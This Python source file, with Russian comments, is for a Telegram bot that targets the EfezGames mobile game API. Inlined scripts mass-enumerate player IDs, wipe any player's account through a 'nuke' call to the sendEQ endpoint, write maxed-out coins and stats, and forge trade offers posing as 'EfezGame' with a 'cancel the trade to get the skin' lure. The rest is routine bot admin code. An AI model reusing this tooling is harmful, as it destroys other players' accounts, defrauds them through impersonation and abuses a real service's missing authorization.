ALLOWED_COUNTRIES = {"RU", "DE", "PL", "US", "UA"}

# Глобальные переменные модуля (инициализируются при запуске)
_output_dir = "parsing"
_producer_running = False
_consumer_running = False
_producer_checked = 0
_producer_found_premium = 0
_consumer_processed = 0
_stats_lock = threading.Lock()
_stop_event = None

def _get_path(filename: str) -> str:
    """Возвращает полный путь к файлу в папке output_dir."""
    return os.path.join(_output_dir, filename)

def _load_processed_ids():
    """Загружает множество уже обработанных ID из processed.txt"""
    path = _get_path('processed.txt')
    if not os.path.exists(path):
        return set()
    with open(path, 'r', encoding='utf-8') as f:
        return set(line.strip() for line in f if line.strip())

def _shorten_id(player_id):
    if len(player_id) > 7:
        return f"{player_id[:7]}..."
    return player_id

def _producer_worker(stop_event):
    global _producer_checked, _producer_found_premium
    session = requests.Session()
    unique_ids = set()

    while not stop_event.is_set():
        random_num = random.randint(ID_RANGE_START, ID_RANGE_END)
        req_start = time.time()

        try:
            # ШАГ 1: поиск пользователя
            resp_find = session.get(URL_FIND, params={"ID": str(random_num)}, timeout=10)

            if resp_find.status_code == 200:
                data_find = resp_find.json()
                player_id = data_find.get("_id")

                if not player_id:
                    continue

                if player_id in unique_ids:
                    continue
                unique_ids.add(player_id)

                # Запись ВСЕХ найденных ID в общий файл
                with open(_get_path('user_id.txt'), "a", encoding="utf-8") as f:
                    f.write(player_id + "\n")

                # ШАГ 2: проверка премиум-статуса
                resp_check = session.get(URL_CHECK, params={"playerID": player_id}, timeout=10)
                duration = round(time.time() - req_start, 3)

                if resp_check.status_code == 200:
                    data_check = resp_check.json()
                    is_premium = data_check.get('premium') is True

                    if is_premium:
                        with open(_get_path('premiumaccount.csv'), 'a', encoding='utf-8', newline='') as f:
                            csv.writer(f).writerow([player_id])
                        with _stats_lock:
                            _producer_found_premium += 1
                        print('\a', end='')
                    else:
                        with open(_get_path('no_prem_account.csv'), 'a', encoding='utf-8', newline='') as f:
                            csv.writer(f).writerow([player_id])

                    with _stats_lock:
                        _producer_checked += 1
                        current_time = datetime.now().strftime("%H:%M:%S")
                        status = "PREMIUM ✅" if is_premium else "Обычный ❌"
                        print(f"[PRODUCER][{current_time}] #{_producer_checked} {_shorten_id(player_id)} -> {status} ({duration}s)")

            else:
                time.sleep(1)

        except Exception:
            time.sleep(0.5)

def _consumer_check_id(p_id, stop_event):
    """Проверяет один ID: запрос getEQ и сохранение по стране"""
    req_start = time.time()
    try:
        response = requests.get(URL_CHECK, params={"playerID": p_id}, timeout=15)
        duration = time.time() - req_start
        if response.status_code == 200:
            data = response.json()
            country = data.get("country")
            if country in ALLOWED_COUNTRIES:
                filename = f"{country}account.csv"
                with open(_get_path(filename), 'a', newline='', encoding='utf-8') as f:
                    csv.writer(f).writerow([p_id])
            with open(_get_path('processed.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{p_id}\n")
            with _stats_lock:
                _consumer_processed += 1
            status_icon = "✅"
            label = country if country else "???"
        else:
            status_icon = "❌"
            label = f"HTTP:{response.status_code}"
            duration = time.time() - req_start
    except Exception:
        status_icon = "❌"
        label = "???"
        duration = time.time() - req_start

    with _stats_lock:
        current_time = datetime.now().strftime("%H:%M:%S")
        print(f"[CONSUMER][{current_time}] {_shorten_id(p_id)} -> [{label}] {status_icon} ({duration:.2f}s)")

def _consumer_worker(stop_event):
    """Поток consumer: читает новые строки из user_id.txt и отправляет их в пул на обработку"""
    file_position = 0
    processed = _load_processed_ids()

    while not os.path.exists(_get_path('user_id.txt')) and not stop_event.is_set():
        time.sleep(2)
    if stop_event.is_set():
        return

    with open(_get_path('user_id.txt'), 'r', encoding='utf-8') as f:
        f.seek(0, os.SEEK_END)
        file_position = f.tell()

    with ThreadPoolExecutor(max_workers=CONSUMER_THREADS) as executor:
        while not stop_event.is_set():
            try:
                with open(_get_path('user_id.txt'), 'r', encoding='utf-8') as f:
                    f.seek(file_position)
                    new_lines = f.readlines()
                    if new_lines:
                        file_position = f.tell()
                        futures = []
                        for line in new_lines:
                            p_id = line.strip()
                            if not p_id or p_id in processed:
                                continue
                            futures.append(executor.submit(_consumer_check_id, p_id, stop_event))
                    else:
                        time.sleep(1)
            except Exception as e:
                print(f"[CONSUMER] Ошибка: {e}")
                time.sleep(2)

def run_parser(output_dir: str, stop_event: threading.Event):
    """Основная функция парсера, запускается в отдельном потоке."""
    global _output_dir, _producer_running, _consumer_running, _stop_event
    _output_dir = output_dir
    os.makedirs(_output_dir, exist_ok=True)
    _stop_event = stop_event

    _producer_running = True
    _consumer_running = True

    producer_threads = []
    for _ in range(PRODUCER_THREADS):
        t = threading.Thread(target=_producer_worker, args=(stop_event,), daemon=True)
        t.start()
        producer_threads.append(t)

    consumer_thread = threading.Thread(target=_consumer_worker, args=(stop_event,), daemon=True)
    consumer_thread.start()

    stop_event.wait()

    _producer_running = False
    _consumer_running = False
    time.sleep(2)

def get_stats() -> Dict[str, Any]:
    """Возвращает текущую статистику парсера."""
    with _stats_lock:
        return {
            "producer_checked": _producer_checked,
            "producer_found_premium": _producer_found_premium,
            "consumer_processed": _consumer_processed,
            "running": _producer_running or _consumer_running
        }

def is_running() -> bool:
    return _producer_running or _consumer_running
# ===== END INLINED scripts/{name} =====



# ===== INLINED FROM scripts/nuke.py =====
import requests
from typing import Tuple

API_BASE_URL = "https://api.efezgames.com/v1"

def nuke_player(player_id: str) -> Tuple[bool, str]:
    """
    Сбрасывает данные игрока (NUKE).
    Возвращает (успех, сообщение).
    """
    try:
        url = f"{API_BASE_URL}/equipment/sendEQ"

        data = {
            "playerID": player_id,
            "data": "0;0;0;0;0;0;0;0;0;0;0",
            "favouriteSkins": "0",
            "stats": "0",
            "description": "<color=blue><size=25>[XxX] t.me/xuwyx",
            "agentsForLevelAdded": "0",
            "favouriteModes": "0",
            "eqValue": 0,
            "internalID": 3297273,
            "nick": "gbd",
            "premium": False,
            "version": "2.30.0",
            "blockedUsers": player_id,
            "onesignalid": "SIgnalCustom"
        }

        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            return True, f"Статус: {response.status_code}\nОтвет: {response.text}"
        else:
            return False, f"Ошибка HTTP {response.status_code}\n{response.text}"
    except requests.exceptions.RequestException as e:
        return False, f"Ошибка запроса: {e}"
    except Exception as e:
        return False, f"Неизвестная ошибка: {e}"
# ===== END INLINED scripts/{name} =====



# ===== INLINED FROM scripts/equipment.py =====
import requests
from typing import Tuple

API_BASE_URL = "https://api.efezgames.com/v1"

def apply_max_stats(player_id: str) -> Tuple[bool, str]:
    """
    Отправляет POST-запрос для применения максимальных характеристик (монеты, опыт, кейсы).
    Возвращает (успех, сообщение).
    """
    url = f"{API_BASE_URL}/equipment/sendEQ"
    # Параметры скопированы из предоставленного скрипта
    params = {
        "playerID": player_id,
        "description": "",
        "data": "999991;2999992;39999;499999;99995;699999;999997;9999998;99999;999999",
        "stats": "1:1,2:1,3:1,4:07,5:66,6:281.21,7:346.50,8:0,9:1342,11:518,13:1074,15:247.60,16:320.70,17:2.00,18:1100,19:1,20:1,23:0,24:52,25:2457598,26:314,27:22,28:92,29:1.164,30:108,31:7348748,32:1,33:18,34:54,35:8,36:0,37:0,38:0,39:0,40:0,41:0,42:0"
    }
    try:
        response = requests.post(url, data=params, timeout=15)
        if response.status_code == 200:
            return True, f"Статус: {response.status_code}\nОтвет: {response.text}"
        else:
            return False, f"Ошибка HTTP {response.status_code}\n{response.text}"
    except Exception as e:
        return False, str(e)
# ===== END INLINED scripts/{name} =====



# ===== INLINED FROM scripts/sender_profile.py =====
import json, os, random, string
from datetime import datetime, timezone, timedelta
DEFAULT_SENDER_PROFILE = {"auto_update_enabled": False, "update_interval_seconds": 60, "main_nick": "EfezGame", "sender_frame": "vG", "sender_avatar": "ys", "main_message": "Отмени трейд чтобы забрать скин", "nick_cycle": [], "message_cycle": [], "schedule_msk": {"enabled": False, "start": "00:00", "end": "23:59"}}
MSK_TZ = timezone(timedelta(hours=3))
def msk_now(): return datetime.now(MSK_TZ)
def load_sender_profile_config(path: str):
    if not os.path.exists(path):
        save_sender_profile_config(path, DEFAULT_SENDER_PROFILE.copy()); return json.loads(json.dumps(DEFAULT_SENDER_PROFILE))
    try:
        with open(path, "r", encoding="utf-8") as f: data = json.load(f)
    except Exception: data = {}
    merged = json.loads(json.dumps(DEFAULT_SENDER_PROFILE))
    for key in ("auto_update_enabled","update_interval_seconds","main_nick","sender_frame","sender_avatar","main_message","nick_cycle","message_cycle"):
        if key in data: merged[key] = data[key]
    if isinstance(data.get("schedule_msk"), dict): merged["schedule_msk"].update(data["schedule_msk"])
    return merged
def save_sender_profile_config(path: str, data: dict):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f: json.dump(data, f, indent=2, ensure_ascii=False)
def _time_to_minutes(hhmm: str) -> int:
    h,m = hhmm.split(":"); return int(h)*60+int(m)
def _schedule_active(profile: dict) -> bool:
    sched = profile.get("schedule_msk", {})
    if not sched.get("enabled"): return True
    now = msk_now(); cur = now.hour*60+now.minute
    start = _time_to_minutes(sched.get("start","00:00")); end = _time_to_minutes(sched.get("end","23:59"))
    return start <= cur <= end if start <= end else (cur >= start or cur <= end)
def _pick_rotated(items: list, interval_seconds: int, fallback: str) -> str:
    if not items: return fallback
    idx = (int(msk_now().timestamp()) // max(10, interval_seconds)) % len(items)
    return items[idx]
def get_effective_sender_profile(profile: dict) -> dict:
    result = {"senderNick": profile.get("main_nick","EfezGame"), "senderFrame": profile.get("sender_frame","vG"), "senderAvatar": profile.get("sender_avatar","ys"), "message": profile.get("main_message","Отмени трейд чтобы забрать скин")}
    if profile.get("auto_update_enabled") and _schedule_active(profile):
        result["senderNick"] = _pick_rotated(profile.get("nick_cycle",[]), profile.get("update_interval_seconds",60), result["senderNick"])
        result["message"] = _pick_rotated(profile.get("message_cycle",[]), profile.get("update_interval_seconds",60), result["message"])
    return result
def _generate_random_string(length=10):
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))
def build_trade_offer_params(game_id: str, skin: str, unique_code: str, config_path: str):
    profile = load_sender_profile_config(config_path)
    effective = get_effective_sender_profile(profile)
    base_message = (effective["message"] or "Отмени трейд чтобы забрать скин").strip()
    full_message = f"{base_message} | {unique_code}"
    params = {"token": _generate_random_string(), "playerID": game_id, "receiverID": game_id, "senderNick": effective["senderNick"], "senderFrame": effective["senderFrame"], "senderAvatar": effective["senderAvatar"], "receiverNick": effective["senderNick"], "receiverFrame": effective["senderFrame"], "receiverAvatar": effective["senderAvatar"], "skinsOffered": skin, "skinsRequested": skin, "message": full_message, "pricesHash": "fbd9aec4384456124c0765581a4ba099", "senderOneSignal": _generate_random_string(), "receiverOneSignal": _generate_random_string(), "senderVersion": _generate_random_string(), "receiverVersion": _generate_random_string()}
    return params, full_message
def format_sender_profile_config(profile: dict) -> str:
    sched = profile.get("schedule_msk", {})
    lines = ["⚙️ Профиль отправителя трейда", f"Автообновление: {'true' if profile.get('auto_update_enabled') else 'false'}", f"Интервал: {profile.get('update_interval_seconds',60)} сек", f"Ник (основной): {profile.get('main_nick','')}", f"Рамка: {profile.get('sender_frame','')}", f"Аватарка: {profile.get('sender_avatar','')}", f"Сообщение (основное): {profile.get('main_message','')}", f"Расписание по МСК: {'on' if sched.get('enabled') else 'off'} {sched.get('start','00:00')} - {sched.get('end','23:59')}", "", "Ники по кругу:"]
    for i, item in enumerate(profile.get("nick_cycle",[]),1): lines.append(f"{i}. {item}")
    if not profile.get("nick_cycle"): lines.append("—")
    lines.append(""); lines.append("Сообщения по кругу:")
    for i, item in enumerate(profile.get("message_cycle",[]),1): lines.append(f"{i}. {item}")
    if not profile.get("message_cycle"): lines.append("—")
    return "\n".join(lines)
# ===== END INLINED scripts/{name} =====


# ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
monitor_running = False
monitor_task: Optional[asyncio.Task] = None
sender_ids: Dict[int, str] = {}
nick_cache: Dict[str, str] = {}
active_tasks: Dict[str, asyncio.Task] = {}
flood_until: Dict[Tuple[int, int], float] = {}
parser_thread: Optional[threading.Thread] = None
parser_stop_event: Optional[threading.Event] = None

reply_map: Dict[int, Tuple[str, str]] = {}
awaiting_lang: Dict[int, Dict] = {}
awaiting_search: Dict[int, bool] = {}
awaiting_friend_add: Dict[int, bool] = {}
awaiting_view_profile: Dict[int, bool] = {}
awaiting_activate_promo: Dict[int, bool] = {}
awaiting_withdraw_skin: Dict[int, str] = {}  # user_id -> item_id для вывода через reply

# Кеш описаний профилей для мониторинга
description_cache: Dict[str, str] = {}

# Состояние бота: доступен ли для обычных игроков
bot_online = True

# ============= СПРАВОЧНИКИ =============
SKIN_NAMES = {}      # код скина -> название
STICKER_NAMES = {}   # код наклейки -> название
MODIFIER_NAMES = {}  # число модификатора -> описание

def load_skin_names():
    global SKIN_NAMES, STICKER_NAMES
    SKIN_NAMES.clear()
    STICKER_NAMES.clear()
    for raw_line in EMBEDDED_SKINS_TEXT.splitlines():
        line = raw_line.strip()
        if not line or '|' not in line:
            continue
        parts = line.split('|', 1)
        code = parts[0].strip()
        name = parts[1].strip()
        if code and code[0] in ('Y','Z','X','W','T','S','R','Q','P','O','N','M','L','K','J','I','H','G','F','E','D','C','B','A') and len(code) == 2:
            STICKER_NAMES[code] = name
        else:
            SKIN_NAMES[code] = name
    logger.info(f"Загружено скинов: {len(SKIN_NAMES)}, наклеек: {len(STICKER_NAMES)}")

def load_modifiers():
    global MODIFIER_NAMES
    MODIFIER_NAMES.clear()
    for raw_line in EMBEDDED_MODIFIERS_TEXT.splitlines():
        line = raw_line.strip()
        if line.startswith('«') and '»' in line:
            m = re.search(r'«(\d+)»\s*=\s*\[(.*?)\]', line)
            if m:
                mod = int(m.group(1))
                desc = m.group(2)
                MODIFIER_NAMES[mod] = desc
    logger.info(f"Загружено модификаторов: {len(MODIFIER_NAMES)}")

load_skin_names()
load_modifiers()

# ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
def _is_player_storage(filename: str) -> bool:
    normalized = os.path.normpath(filename)
    return normalized in {
        os.path.normpath(PLAYERS_FILE),
        os.path.normpath(LEGACY_PLAYERS_FILE),
        os.path.normpath(PLAYER_DATA_DIR),
    }


def _merge_per_player_files() -> dict:
    players = {}
    if not os.path.isdir(PLAYER_DATA_DIR):
        return players
    for name in os.listdir(PLAYER_DATA_DIR):
        if not name.endswith('.json') or name == 'players.json':
            continue
        player_id = os.path.splitext(name)[0]
        if not str(player_id).isdigit():
            continue
        file_path = os.path.join(PLAYER_DATA_DIR, name)
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                payload = json.load(f)
            if isinstance(payload, dict):
                payload.setdefault('telegram_id', int(player_id))
                players[str(player_id)] = payload
        except Exception as e:
            logger.error(f"Ошибка загрузки игрока {file_path}: {e}")
    return players


def _load_player_storage() -> dict:
    if os.path.exists(PLAYERS_FILE):
        try:
            with open(PLAYERS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if isinstance(data, dict):
                return data
        except Exception as e:
            logger.error(f"Ошибка загрузки {PLAYERS_FILE}: {e}")
    per_player = _merge_per_player_files()
    if per_player:
        return per_player
    if os.path.exists(LEGACY_PLAYERS_FILE):
        try:
            with open(LEGACY_PLAYERS_FILE, 'r', encoding='utf-8') as f:
                legacy_players = json.load(f)
            if isinstance(legacy_players, dict):
                return legacy_players
        except Exception as e:
            logger.error(f"Ошибка загрузки legacy players {LEGACY_PLAYERS_FILE}: {e}")
    return {}


def _save_player_storage(players: dict):
    os.makedirs(PLAYER_DATA_DIR, exist_ok=True)
    try:
        with open(PLAYERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(players, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Ошибка сохранения {PLAYERS_FILE}: {e}")


def migrate_legacy_players_to_player_dir():
    os.makedirs(PLAYER_DATA_DIR, exist_ok=True)
    if not os.path.exists(PLAYERS_FILE):
        merged = _merge_per_player_files()
        if merged:
            _save_player_storage(merged)
        elif os.path.exists(LEGACY_PLAYERS_FILE):
            try:
                with open(LEGACY_PLAYERS_FILE, 'r', encoding='utf-8') as f:
                    legacy_players = json.load(f)
                if isinstance(legacy_players, dict):
                    _save_player_storage(legacy_players)
            except Exception as e:
                logger.error(f"Ошибка миграции игроков в {PLAYERS_FILE}: {e}")

    migrations = [
        ("data/inventory.json", INVENTORY_FILE, {}),
        ("data/exchanges.json", EXCHANGES_FILE, {}),
        ("data/whitetrade.json", WHITETRADE_FILE, {}),
        ("data/promocodes.json", PROMOCODES_FILE, {}),
    ]
    for legacy_path, target_path, empty_default in migrations:
        if os.path.exists(target_path):
            continue
        if os.path.exists(legacy_path):
            try:
                with open(legacy_path, 'r', encoding='utf-8') as f:
                    payload = json.load(f)
            except Exception:
                payload = empty_default
        else:
            payload = empty_default
        try:
            with open(target_path, 'w', encoding='utf-8') as f:
                json.dump(payload, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Ошибка миграции {legacy_path} -> {target_path}: {e}")


migrate_legacy_players_to_player_dir()

def get_player_by_nick(nick: str, players: dict) -> Optional[str]:
    logger.info(f"Поиск игрока по нику: {nick}")
    for tid, pdata in players.items():
        game_nick = pdata.get('game_nick')
        if game_nick and game_nick.lower() == nick.lower():
            return tid
    return None

def get_player_role(user_id: int) -> str:
    players = load_json(PLAYERS_FILE, {})
    pdata = players.get(str(user_id), {})
    if user_id == OWNER_ID:
        return "owner"
    return pdata.get("role", "user")

def is_admin_or_owner(user_id: int) -> bool:
    role = get_player_role(user_id)
    return role in ("admin", "owner")

def is_banned(user_id: int) -> bool:
    players = load_json(PLAYERS_FILE, {})
    return players.get(str(user_id), {}).get('banned', False)

def update_player_stats(user_id: int, user=None):
    players = load_json(PLAYERS_FILE, {})
    uid = str(user_id)
    if uid in players:
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        players[uid]['commands_count'] = players[uid].get('commands_count', 0) + 1
        players[uid]['last_command_at'] = now_str
        players[uid]['last_seen_at'] = now_str
        players[uid].setdefault('telegram_id', int(user_id))
        if user is not None:
            players[uid]['tg_username'] = getattr(user, 'username', players[uid].get('tg_username'))
            players[uid]['tg_first_name'] = getattr(user, 'first_name', players[uid].get('tg_first_name'))
            players[uid]['tg_last_name'] = getattr(user, 'last_name', players[uid].get('tg_last_name'))
            players[uid]['tg_full_name'] = getattr(user, 'full_name', players[uid].get('tg_full_name'))
            players[uid]['tg_language_code'] = getattr(user, 'language_code', players[uid].get('tg_language_code'))
        save_json(PLAYERS_FILE, players)


def enrich_existing_player_data():
    players = load_json(PLAYERS_FILE, {})
    changed = False
    for uid, pdata in list(players.items()):
        if not isinstance(pdata, dict):
            continue
        pdata.setdefault('telegram_id', int(uid) if str(uid).isdigit() else uid)
        pdata.setdefault('tg_username', pdata.get('username'))
        full_name = ' '.join(part for part in [pdata.get('tg_first_name'), pdata.get('tg_last_name')] if part)
        if full_name:
            pdata.setdefault('tg_full_name', full_name)
        pdata.setdefault('registered_at', pdata.get('created_at', ''))
        pdata.setdefault('registration_unix', 0)
        pdata.setdefault('last_seen_at', pdata.get('last_command_at', ''))
        changed = True
    if changed:
        save_json(PLAYERS_FILE, players)


enrich_existing_player_data()

def generate_referral_code() -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def format_coins(amount: int) -> str:
    return f"{amount:,}".replace(",", ".")

def load_promocodes():
    return load_json(PROMOCODES_FILE, {})

def save_promocodes(data):
    save_json(PROMOCODES_FILE, data)

def load_broadcasts():
    return load_json(BROADCASTS_FILE, {})

def save_broadcasts(data):
    save_json(BROADCASTS_FILE, data)

# ============= ПРОВЕРКА РЕГИСТРАЦИИ =============
def is_registered(user_id: int) -> bool:
    players = load_json(PLAYERS_FILE, {})
    return str(user_id) in players

def require_registration(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_registered(user_id):
            await update.message.reply_text("❌ Сначала зарегистрируйтесь через /start")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def check_ban(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if is_banned(user_id):
            await update.message.reply_text("❌ Вы были заблокированы")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ============= КОМАНДЫ ДЛЯ МОНЕТ =============
@require_registration
@check_ban
async def money_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    players = load_json(PLAYERS_FILE, {})
    coins = players[str(user_id)].get('coins', 0)
    await update.message.reply_text(f"💰 Ваш баланс: {format_coins(coins)} монет")
    update_player_stats(user_id)

async def money_give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /money give <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['coins'] = players[target_id].get('coins', 0) + amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Игроку {target_nick} выдано {format_coins(amount)} монет")
    update_player_stats(update.effective_user.id, update.effective_user)

async def money_set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /money set <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['coins'] = amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Баланс игрока {target_nick} установлен на {format_coins(amount)}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def money_take_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /money take <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    current = players[target_id].get('coins', 0)
    new_amount = max(0, current - amount)
    players[target_id]['coins'] = new_amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ У игрока {target_nick} забрано {format_coins(amount)} монет. Теперь: {format_coins(new_amount)}")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= КОМАНДЫ ДЛЯ ТОКЕНОВ =============
@require_registration
@check_ban
async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    players = load_json(PLAYERS_FILE, {})
    tokens = players[str(user_id)].get('tokens', 0)
    await update.message.reply_text(f"💎 Ваш баланс токенов: {tokens}")
    update_player_stats(user_id)

async def tokens_give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /tokens give <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['tokens'] = players[target_id].get('tokens', 0) + amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Игроку {target_nick} выдано {amount} токенов")
    update_player_stats(update.effective_user.id, update.effective_user)

async def tokens_set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /tokens set <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['tokens'] = amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Баланс токенов игрока {target_nick} установлен на {amount}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def tokens_take_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /tokens take <ник> <количество>")
        return
    target_nick = args[0]
    try:
        amount = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Количество должно быть числом")
        return
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    current = players[target_id].get('tokens', 0)
    new_amount = max(0, current - amount)
    players[target_id]['tokens'] = new_amount
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ У игрока {target_nick} забрано {amount} токенов. Теперь: {new_amount}")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= БАН/РАЗБАН =============
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Использование: /ban <ник>")
        return
    target_nick = args[0]
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['banned'] = True
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Пользователь {target_nick} забанен")
    update_player_stats(update.effective_user.id, update.effective_user)

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Использование: /unban <ник>")
        return
    target_nick = args[0]
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return
    players[target_id]['banned'] = False
    save_json(PLAYERS_FILE, players)
    await update.message.reply_text(f"✅ Пользователь {target_nick} разбанен")
    update_player_stats(update.effective_user.id, update.effective_user)

# ============= ПОИСК ИГРОКА (АДМИНСКАЯ ФУНКЦИЯ) =============
async def find_player_by_nick(nick: str) -> Optional[Dict]:
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(nick, players)
    if target_id:
        return players[target_id]
    return None

async def handle_find_player(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in awaiting_search:
        return False
    nick = update.message.text.strip()
    del awaiting_search[user_id]

    player_data = await find_player_by_nick(nick)
    if not player_data:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return True

    game_id = player_data.get('game_id')
    game_banned = False
    game_description = "неизвестно"
    if game_id:
        try:
            url = f"{API_BASE_URL}/equipment/getEQ?playerID={game_id}"
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                game_data = resp.json()
                game_description = game_data.get('description', 'нет')
                game_banned = game_data.get('banned', False)
        except Exception as e:
            logger.error(f"Ошибка получения EQ для {game_id}: {e}")

    text = (
        f"Информация о игроке ⤵︎\n"
        f"• Ник в игре: {player_data.get('game_nick', 'неизвестно')}\n"
        f"• Айди игрока в игре: {player_data.get('game_id', 'неизвестно')}\n"
        f"• Описание игрока в игре: {game_description}\n"
        f"• Забанен ли пользователь в игре: {'Да' if game_banned else 'Нет'}\n"
        f"• Забанен ли пользователь в боте: {'Да' if player_data.get('banned') else 'Нет'}\n"
        f"• Дата регистрации в боте: {player_data.get('registered_at', 'неизвестно')}\n"
        f"• Дата последнего сообщения в боте: {player_data.get('last_command_at', 'неизвестно')}\n"
        f"• Сколько было отправлено сообщений в бота: {player_data.get('commands_count', 0)}"
    )
    await update.message.reply_text(text)
    return True

# ============= АДМИНСКИЙ ПРОФИЛЬ =============
@require_registration
@check_ban
async def admin_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin_or_owner(user_id):
        await update.message.reply_text("⛔ Недоступно")
        return
    players = load_json(PLAYERS_FILE, {})
    pdata = players.get(str(user_id), {})
    coins = pdata.get('coins', 0)
    tokens = pdata.get('tokens', 0)
    coins_str = format_coins(coins)
    tokens_str = format_coins(tokens)

    expiry_str = pdata.get('admin_expires')
    if expiry_str:
        try:
            expiry = datetime.fromisoformat(expiry_str)
            remaining = expiry - datetime.now()
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                time_left = f"{days}д {hours}ч {minutes}м"
            else:
                time_left = "Истекло"
        except:
            time_left = "Навсегда"
    else:
        time_left = "Навсегда"

